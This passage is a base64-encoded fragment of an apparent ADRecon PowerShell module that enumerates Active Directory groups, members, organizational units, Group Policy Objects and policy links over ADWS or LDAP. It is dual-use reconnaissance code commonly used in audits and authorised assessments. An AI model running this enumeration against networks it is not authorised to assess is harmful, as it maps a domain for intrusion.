V3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5IC1Bcmd1bWVudExpc3QgKCRETikKICAgICAgICAgICAgICAgICRBRERvbWFpblNJRCA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJEFET2JqZWN0Lm9iamVjdFNpZFswXSwgMCkKICAgICAgICAgICAgICAgICRBRE9iamVjdC5kaXNwb3NlKCkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdyb3VwTWVtYmVyXSBFcnJvciByZXRyaWV2aW5nIERvbWFpbiBTSUQgdXNpbmcgdGhlIEdsb2JhbENhdGFsb2cgJCgkR2xvYmFsQ2F0YWxvZy5JUEFkZHJlc3MpLiBVc2luZyBTSUQgZnJvbSB0aGUgT2JqRG9tYWluLiIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgJEFERG9tYWluU0lEID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkb2JqRG9tYWluLm9iamVjdFNpZFswXSwgMCkKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENsYXNzPWdyb3VwKSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoInNhbWFjY291bnRuYW1lIiwgIm9iamVjdHNpZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREdyb3VwcyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR3JvdXBNZW1iZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIEdyb3VwIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIofChtZW1iZXJvZj0qKShwcmltYXJ5Z3JvdXBpZD0qKSkiCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJkaXN0aW5ndWlzaGVkbmFtZSIsICJkbnNob3N0bmFtZSIsICJwcmltYXJ5Z3JvdXBpZCIsICJtZW1iZXJvZiIsICJzYW1hY2NvdW50bmFtZSIsICJzYW1hY2NvdW50dHlwZSIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREdyb3VwTWVtYmVycyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR3JvdXBNZW1iZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIEdyb3VwTWVtYmVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoICgkQUREb21haW5TSUQpIC1hbmQgKCRBREdyb3VwcykgLWFuZCAoJEFER3JvdXBNZW1iZXJzKSApCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgR3JvdXBNZW1iZXIgT2JqZWN0czogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURHcm91cE1lbWJlcnMpKSIKICAgICAgICAgICAgJEdyb3VwTWVtYmVyT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6R3JvdXBNZW1iZXJQYXJzZXIoJEFER3JvdXBzLCAkQURHcm91cE1lbWJlcnMsICRBRERvbWFpblNJRCwgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREdyb3VwcwogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURHcm91cE1lbWJlcnMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERG9tYWluU0lECiAgICAgICAgfQogICAgfQoKICAgIElmICgkR3JvdXBNZW1iZXJPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRHcm91cE1lbWJlck9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURST1UKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIE9yZ2FuaXphdGlvbmFsIFVuaXRzIChPVSkgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCBPcmdhbml6YXRpb25hbCBVbml0cyAoT1UpIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIFBhZ2VTaXplCiAgICBbaW50XQogICAgVGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LiBEZWZhdWx0IDIwMC4KCi5QQVJBTUVURVIgVGhyZWFkcwogICAgW2ludF0KICAgIFRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZHVyaW5nIHByb2Nlc3Npbmcgb2Ygb2JqZWN0cy4gRGVmYXVsdCAxMC4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMAogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRE9VcyA9IEAoIEdldC1BRE9yZ2FuaXphdGlvbmFsVW5pdCAtRmlsdGVyICogLVByb3BlcnRpZXMgRGlzdGluZ3Vpc2hlZE5hbWUsRGVzY3JpcHRpb24sTmFtZSx3aGVuQ3JlYXRlZCx3aGVuQ2hhbmdlZCApCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUk9VXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBPVSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQoKICAgICAgICBJZiAoJEFET1VzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIE9VczogJChbQURSZWNvbi5BRFdTQ2xhc3NdOjpPYmplY3RDb3VudCgkQURPVXMpKSIKICAgICAgICAgICAgJE9VT2JqID0gW0FEUmVjb24uQURXU0NsYXNzXTo6T1VQYXJzZXIoJEFET1VzLCAkVGhyZWFkcykKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFET1VzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIob2JqZWN0Y2xhc3M9b3JnYW5pemF0aW9uYWx1bml0KSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImRpc3Rpbmd1aXNoZWRuYW1lIiwiZGVzY3JpcHRpb24iLCJuYW1lIiwid2hlbmNyZWF0ZWQiLCJ3aGVuY2hhbmdlZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRE9VcyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURST1VdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIE9VIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFET1VzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIE9VczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURPVXMpKSIKICAgICAgICAgICAgJE9VT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6T1VQYXJzZXIoJEFET1VzLCAkVGhyZWFkcykKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFET1VzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkT1VPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRPVU9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSR1BPCnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGFsbCBHcm91cCBQb2xpY3kgT2JqZWN0cyAoR1BPKSBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIEdyb3VwIFBvbGljeSBPYmplY3RzIChHUE8pIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouUEFSQU1FVEVSIFBhZ2VTaXplCiAgICBbaW50XQogICAgVGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LiBEZWZhdWx0IDIwMC4KCi5QQVJBTUVURVIgVGhyZWFkcwogICAgW2ludF0KICAgIFRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZHVyaW5nIHByb2Nlc3Npbmcgb2Ygb2JqZWN0cy4gRGVmYXVsdCAxMC4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMAogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREdQT3MgPSBAKCBHZXQtQURPYmplY3QgLUxEQVBGaWx0ZXIgJyhvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lciknIC1Qcm9wZXJ0aWVzIERpc3BsYXlOYW1lLERpc3Rpbmd1aXNoZWROYW1lLE5hbWUsZ1BDRmlsZVN5c1BhdGgsd2hlbkNyZWF0ZWQsd2hlbkNoYW5nZWQgKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUE9dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIGdyb3VwUG9saWN5Q29udGFpbmVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURHUE9zKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIEdQT3M6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFER1BPcykpIgogICAgICAgICAgICAkR1BPc09iaiA9IFtBRFJlY29uLkFEV1NDbGFzc106OkdQT1BhcnNlcigkQURHUE9zLCAkVGhyZWFkcykKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFER1BPcwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKSIKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURHUE9zID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUE9dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIGdyb3VwUG9saWN5Q29udGFpbmVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFER1BPcykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBHUE9zOiAkKFtBRFJlY29uLkxEQVBDbGFzc106Ok9iamVjdENvdW50KCRBREdQT3MpKSIKICAgICAgICAgICAgJEdQT3NPYmogPSBbQURSZWNvbi5MREFQQ2xhc3NdOjpHUE9QYXJzZXIoJEFER1BPcywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREdQT3MKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRHUE9zT2JqKQogICAgewogICAgICAgIFJldHVybiAkR1BPc09iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgojIGJhc2VkIG9uIGh0dHBzOi8vZ2l0aHViLmNvbS9Hb2F0ZWVQRkUvR1BMaW5rUmVwb3J0L2Jsb2IvbWFzdGVyL2dQTGlua1JlcG9ydC5wczEKRnVuY3Rpb24gR2V0LUFEUkdQTGluawp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyBhbGwgZ3JvdXAgcG9saWN5IGxpbmtzIChnUExpbmspIGFwcGxpZWQgdG8gU2NvcGUgb2YgTWFuYWdlbWVudCAoU09NKSBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIGdyb3VwIHBvbGljeSBsaW5rcyAoZ1BMaW5rKSBhcHBsaWVkIHRvIFNjb3BlIG9mIE1hbmFnZW1lbnQgKFNPTSkgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEU09NcyA9IEAoIEdldC1BRE9iamVjdCAtTERBUEZpbHRlciAnKHwob2JqZWN0Y2xhc3M9ZG9tYWluKShvYmplY3RjbGFzcz1vcmdhbml6YXRpb25hbFVuaXQpKScgLVByb3BlcnRpZXMgRGlzdGluZ3Vpc2hlZE5hbWUsTmFtZSxnUExpbmssZ1BPcHRpb25zICkKICAgICAgICAgICAgJEFEU09NcyArPSBAKCBHZXQtQURPYmplY3QgLVNlYXJjaEJhc2UgIkNOPVNpdGVzLCQoKEdldC1BRFJvb3REU0UpLmNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIgLUxEQVBGaWx0ZXIgIihvYmplY3RjbGFzcz1zaXRlKSIgLVByb3BlcnRpZXMgRGlzdGluZ3Vpc2hlZE5hbWUsTmFtZSxnUExpbmssZ1BPcHRpb25zICkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR1BMaW5rXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBTT00gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURHUE9zID0gQCggR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpJyAtUHJvcGVydGllcyBEaXNwbGF5TmFtZSxEaXN0aW5ndWlzaGVkTmFtZSApCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdQTGlua10gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgZ3JvdXBQb2xpY3lDb250YWluZXIgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCAoJEFEU09NcykgLWFuZCAoJEFER1BPcykgKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIFNPTXM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFEU09NcykpIgogICAgICAgICAgICAkU09NT2JqID0gW0FEUmVjb24uQURXU0NsYXNzXTo6U09NUGFyc2VyKCRBREdQT3MsICRBRFNPTXMsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURTT01zCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREdQT3MKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRBRFNPTXMgPSBAKCkKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIofChvYmplY3RjbGFzcz1kb21haW4pKG9iamVjdGNsYXNzPW9yZ2FuaXphdGlvbmFsVW5pdCkpIgogICAgICAgICRPYmpTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgiZGlzdGluZ3Vpc2hlZG5hbWUiLCJuYW1lIiwiZ3BsaW5rIiwiZ3BvcHRpb25zIikpCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEU09NcyArPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdQTGlua10gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgU09NIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICAkU2VhcmNoUGF0aCA9ICJDTj1TaXRlcyIKICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgewogICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkRG9tYWluQ29udHJvbGxlcikvJFNlYXJjaFBhdGgsJCgkb2JqRG9tYWluUm9vdERTRS5Db25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kU2VhcmNoUGF0aCwkKCRvYmpEb21haW5Sb290RFNFLkNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIKICAgICAgICB9CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIihvYmplY3RjbGFzcz1zaXRlKSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImRpc3Rpbmd1aXNoZWRuYW1lIiwibmFtZSIsImdwbGluayIsImdwb3B0aW9ucyIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFNPTXMgKz0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUExpbmtdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFNPTSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgICRPYmpTZWFyY2hlci5kaXNwb3NlKCkKCiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENhdGVnb3J5PWdy